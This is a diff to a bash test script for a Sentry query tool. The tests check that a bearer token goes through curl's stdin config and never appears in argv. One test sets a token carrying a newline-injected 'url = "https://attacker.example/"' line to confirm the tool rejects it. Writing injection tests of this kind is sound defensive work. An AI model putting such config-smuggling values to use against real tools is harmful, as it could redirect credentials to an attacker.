@@ -39,6 +39,8 @@ mkdir -p "$TMP/bin"
 cat > "$TMP/bin/curl" <<'SPY'
 #!/usr/bin/env bash
 printf '%s\n' "$*" >> "$SPY_ARGV"
+# stdin carries the curl config (the bearer header); record it beside argv.
+[ -t 0 ] || cat >> "${SPY_ARGV}.stdin"
 _out=""; _prev=""
 for a in "$@"; do [[ "$_prev" == "-o" ]] && _out="$a"; _prev="$a"; done
 [[ -n "$_out" ]] && printf '%s' "${SPY_BODY:-{\"data\":[]\}}" > "$_out"
@@ -59,6 +61,24 @@ rc() { cat "$TMP/rc"; }
 argv() { cat "$ARGV" 2>/dev/null; }
 
 H=soleur-git-data-rehearsal-30649892865
+
+# ── the bearer rides curl's STDIN config channel, never argv ─────────────────────────
+# Both halves asserted, never either-or: the header is on stdin AND the token is in no argv line.
+rm -f "${ARGV}.stdin"
+run 200 --host-events "$H" --stats-period 30d >/dev/null
+if [[ "$(cat "${ARGV}.stdin" 2>/dev/null)" == 'header = "Authorization: Bearer ro-fake-not-a-credential"' ]] \
+   && ! argv | grep -cF -- 'ro-fake-not-a-credential' >/dev/null && ! argv | grep -ciE -- 'Bearer|Authorization' >/dev/null; then
+  pass "the bearer is on curl's stdin config and ABSENT from argv"
+else
+  fail "the bearer is on curl's stdin config and ABSENT from argv" "stdin=$(cat "${ARGV}.stdin" 2>/dev/null | cut -c1-60) argv=$(argv | head -1 | cut -c1-120)"; fi
+: > "$ARGV"
+PATH="$TMP/bin:$PATH" SPY_ARGV="$ARGV" SPY_HTTP=200 \
+  SENTRY_ISSUE_RO_TOKEN=$'ro-bad\nurl = "https://attacker.example/"' \
+  bash "$SUT" --host-events "$H" --stats-period 30d >/dev/null 2>&1; _bad_rc=$?
+if [[ "$_bad_rc" -ne 0 && ! -s "$ARGV" ]]; then
+  pass "a newline-bearing token makes ZERO curl calls and exits non-zero"
+else
+  fail "a newline-bearing token makes ZERO curl calls and exits non-zero" "rc=$_bad_rc calls=$(wc -l < "$ARGV")"; fi
 
 # ── the query composition — the half no stubbed-reader test can see ────────────────
 run 200 --host-events "$H" --stats-period 30d >/dev/null
